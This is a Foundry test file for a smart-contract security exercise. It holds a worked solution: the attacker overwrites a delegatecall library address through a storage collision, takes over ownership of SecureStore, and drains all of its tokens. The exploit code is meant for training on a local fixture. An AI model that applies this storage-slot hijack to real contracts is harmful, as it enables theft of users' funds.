// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/utils/DummyERC20.sol";
import "src/call-attacks-2/SecureStore.sol";
import "src/call-attacks-2/AttackSecureStore.sol";
import "src/call-attacks-2/RentingLibrary.sol";

/**
 * @dev run "forge test -vvv --match-contract CA2"
 */
contract TestCA2 is Test {
    uint256 constant INITIAL_SUPPLY = 100 ether;
    uint256 constant ATTACKER_INITIAL_BALANCE = 100 ether;
    uint256 constant STORE_INITIAL_BALANCE = 100_000 ether;
    // Note: USDC has 6 decimals, but here we're using DummyERC20 in its place and it has 18 decimals
    uint256 constant DAILY_RENT_PRICE = 50 ether;

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    RentingLibrary rentingLibrary;
    DummyERC20 usdc;
    SecureStore secureStore;

    function setUp() public {
        /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
        vm.startPrank(deployer);

        // Deploy Library Contract
        rentingLibrary = new RentingLibrary();

        // Deploy Token
        usdc = new DummyERC20("USDC", "USDC", INITIAL_SUPPLY);

        // Deploy secureStore Contract
        secureStore = new SecureStore(address(rentingLibrary), DAILY_RENT_PRICE, address(usdc));

        // Setting up the attacker
        usdc.mint(attacker, ATTACKER_INITIAL_BALANCE);

        // Setting up the SecureStore
        usdc.mint(address(secureStore), STORE_INITIAL_BALANCE);
    }

    function testCallAttack2() public {
        /**
         * CODE YOUR SOLUTION HERE
         */
        vm.startPrank(attacker);
        AttackSecureStore attackSecureStore = new AttackSecureStore();

        uint256 requiredAmount = 1 * DAILY_RENT_PRICE;
        usdc.approve(address(secureStore), requiredAmount * 2);

        // add our attack contract's address into the rentingLibrary slot 0. Since it is waiting for uint we need to convert our address
        secureStore.rentWarehouse(1, uint256(uint160(address(attackSecureStore))));

        vm.warp(secureStore.rentedUntil() + 1 days);

        // now the rentinglibrary is our attack contract we need to call it, and it will change the owner variable

        secureStore.rentWarehouse(1, 666);

        secureStore.withdrawAll();

        /**
         * SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE
         */
        assertEq(usdc.balanceOf(address(secureStore)), 0);
        assertEq(usdc.balanceOf(address(attacker)), ATTACKER_INITIAL_BALANCE + STORE_INITIAL_BALANCE);
    }
}
